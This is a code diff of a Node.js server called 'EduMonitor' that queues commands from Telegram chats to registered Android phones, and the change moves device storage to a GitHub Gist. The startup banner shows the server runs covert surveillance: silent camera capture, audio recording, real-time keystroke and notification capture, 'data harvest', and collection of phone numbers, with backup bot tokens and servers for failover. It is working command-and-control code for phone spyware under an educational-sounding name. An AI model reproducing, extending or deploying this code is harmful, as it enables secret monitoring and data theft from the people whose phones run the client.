+            <h2>📱 Registered Devices (${devices.size})</h2>
             ${Array.from(devices.entries()).map(([id, device]) => {
                 const online = (Date.now() - device.lastSeen) < 300000;
                 return `
@@ -1442,15 +1611,11 @@ app.get('/test', (req, res) => {
                         <p><b>ID:</b> <code>${id}</code></p>
                         <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                         <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
-                        <p><b>First Seen:</b> ${new Date(device.firstSeen).toLocaleString()}</p>
                         <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                         <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
-                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                     </div>
                 `;
             }).join('')}
-            
-            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
         </body>
         </html>
     `);
@@ -1478,14 +1643,12 @@ async function handleCallbackQuery(callbackQuery) {
     
     await answerCallbackQuery(callbackId);
     
-    // Handle commands
     if (data.startsWith('cmd:')) {
         const command = data.substring(4);
         await executeCommandFromButton(chatId, messageId, command, callbackId);
         return;
     }
     
-    // Handle menu navigation (same as before)
     switch (data) {
         case 'help_main':
             await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
@@ -1617,22 +1780,22 @@ async function handleCallbackQuery(callbackQuery) {
             });
             await sendTelegramMessage(chatId, statsMsg);
             break;
-        case data.startsWith('select_device:') && data:
-            const selectedDeviceId = data.split(':')[1];
-            const device = devices.get(selectedDeviceId);
-            if (device) {
-                userDeviceSelection.set(chatId, selectedDeviceId);
-                await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
-                await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-                await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
-            }
-            break;
-        case 'close_menu':
-            await editMessageKeyboard(chatId, messageId, []);
-            await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
-            break;
         default:
-            console.log(`⚠️ Unknown callback: ${data}`);
+            if (data.startsWith('select_device:')) {
+                const selectedDeviceId = data.split(':')[1];
+                const device = devices.get(selectedDeviceId);
+                if (device) {
+                    userDeviceSelection.set(chatId, selectedDeviceId);
+                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
+                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+                    await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
+                }
+            } else if (data === 'close_menu') {
+                await editMessageKeyboard(chatId, messageId, []);
+                await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+            } else {
+                console.log(`⚠️ Unknown callback: ${data}`);
+            }
             break;
     }
 }
@@ -1660,7 +1823,7 @@ async function executeCommandFromButton(chatId, messageId, command, callbackId) 
         messageId: messageId,
         timestamp: Date.now()
     });
-    saveDevices();
+    await saveDevices();
     
     await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
     
@@ -1840,7 +2003,7 @@ async function sendCommandToDevice(chatId, messageId, command) {
         messageId: messageId,
         timestamp: Date.now()
     });
-    saveDevices();
+    await saveDevices();
     
     await sendTelegramMessage(chatId, `✅ Command sent: ${command}`);
 }
@@ -1878,7 +2041,7 @@ async function handleCommand(chatId, command, messageId) {
                 messageId: messageId,
                 timestamp: Date.now()
             });
-            saveDevices();
+            await saveDevices();
             
             await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
         } else {
@@ -1963,7 +2126,7 @@ async function handleCommand(chatId, command, messageId) {
     }
 
     device.lastSeen = Date.now();
-    saveDevices();
+    await saveDevices();
     
     if (!device.pendingCommands) {
         device.pendingCommands = [];
@@ -1977,7 +2140,7 @@ async function handleCommand(chatId, command, messageId) {
         messageId: messageId,
         timestamp: Date.now()
     });
-    saveDevices();
+    await saveDevices();
     
     console.log(`📝 Command queued for device ${selectedDeviceId}: ${cleanCommand}`);
     
@@ -1986,29 +2149,49 @@ async function handleCommand(chatId, command, messageId) {
 
 // ============= START SERVER =============
 
-app.listen(PORT, '0.0.0.0', () => {
-    const serverIP = getServerIP();
-    console.log('\n🚀 ===============================================');
-    console.log(`🚀 EduMonitor Server v7.0 - Complete Failover System`);
-    console.log(`🚀 Server IP: ${serverIP}`);
-    console.log(`🚀 Port: ${PORT}`);
-    console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
-    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
-    console.log(`\n🔄 FAILOVER STATUS:`);
-    console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
-    console.log(`   Active Server URL: ${activeServerUrl}`);
-    console.log(`   Failover Active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
-    console.log(`   Failover Count: ${failoverState.failoverCount}`);
-    console.log(`   Secondary Bot: ${SECONDARY_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
-    console.log(`   Secondary Server: ${SECONDARY_SERVER_URL}`);
-    console.log('\n✅ MENU STRUCTURE:');
-    console.log('   📸 Screenshot → Settings → Config/Targets/Quality/Token');
-    console.log('   📷 Camera → Photo/Silent/Front/Back/Switch');
-    console.log('   🎤 Recording → Start/Stop/Settings → Info/Schedule/Quality');
-    console.log('   📊 Data → NEW Data/ALL Data/Sync & Harvest');
-    console.log('   ⚡ Real-time → Keys/Notifications/All');
-    console.log('   ℹ️ Info → Device Info/Network Info/Mobile Info/Device Name');
-    console.log('   ⚙️ System → Media/App Management/Data Saving/Bot Token');
-    console.log('🚀 ===============================================\n');
-});
+async function startServer() {
+    console.log('🚀 Starting EduMonitor Server with GitHub Gist Storage...');
+    
+    // Check GitHub configuration
+    if (!GITHUB_TOKEN) {
+        console.log('⚠️ GITHUB_TOKEN not set. Using local file storage only.');
+        console.log('   Data will NOT persist across restarts!');
+        console.log('   Set GITHUB_TOKEN in environment variables for persistent storage.');
+    } else {
+        console.log('✅ GitHub token found. Data will be stored in Gist.');
+        if (!GIST_ID) {
+            console.log('📝 No GIST_ID provided. Will create new gist on first save.');
+        } else {
+            console.log(`✅ Using existing gist: ${GIST_ID}`);
+        }
+    }
+    
+    // Load all data
+    await loadAllFromGist();
+    
+    // Start the server
+    app.listen(PORT, '0.0.0.0', () => {
+        const serverIP = getServerIP();
+        console.log('\n🚀 ===============================================');
+        console.log(`🚀 EduMonitor Server v8.0 - GitHub Gist Storage`);
+        console.log(`🚀 Server IP: ${serverIP}`);
+        console.log(`🚀 Port: ${PORT}`);
+        console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
+        console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+        console.log(`\n💾 STORAGE STATUS:`);
+        console.log(`   GitHub Gist: ${octokit ? '✅ Connected' : '❌ Not configured'}`);
+        console.log(`   Gist ID: ${GIST_ID || '❌ Not set'}`);
+        console.log(`   Local Backup: ✅ Active`);
+        console.log(`\n🔄 FAILOVER STATUS:`);
+        console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
+        console.log(`   Active Server URL: ${activeServerUrl}`);
+        console.log(`   Failover Active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
+        console.log(`   Failover Count: ${failoverState.failoverCount}`);
+        console.log(`\n📱 DEVICES:`);
+        console.log(`   Total Registered: ${devices.size}`);
+        console.log('🚀 ===============================================\n');
+    });
+}
+
+// Start the server
+startServer().catch(console.error);
